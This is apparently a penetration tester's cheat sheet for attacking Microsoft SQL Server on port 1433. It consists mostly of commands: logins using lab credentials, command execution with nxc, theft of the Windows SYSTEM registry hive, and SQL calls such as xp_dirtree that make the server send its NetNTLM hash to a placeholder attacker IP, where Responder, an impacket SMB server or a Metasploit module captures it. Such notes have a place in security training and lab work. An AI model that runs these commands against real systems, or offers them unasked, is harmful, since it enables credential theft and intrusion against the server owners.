Port: 1433
https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
https://gabb4r.gitbook.io/oscp-notes/service-enumeration/mssql-port-1433

```sh
# Force NTLM Authentication instead of Kerberos
impacket-mssqlclient Administrator:Lab123@192.168.197.18 -windows-auth

# If impacket doesn't command output
nxc mssql 10.10.133.148 -u sql_svc -p Dolphin1 -X whoami
nxc mssql 10.10.133.148 -u sql_svc -p Dolphin1 --get-file 'C:\\windows.old\\Windows\\System32\\SYSTEM' SYSTEM
```
# Steal NetNTLM hash / Relay attack
```sh
# On target machine (Any 1)
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash (Any 1)
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```

For Command Execution :-
https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/

For MSSQL Injection:-
#mssqli
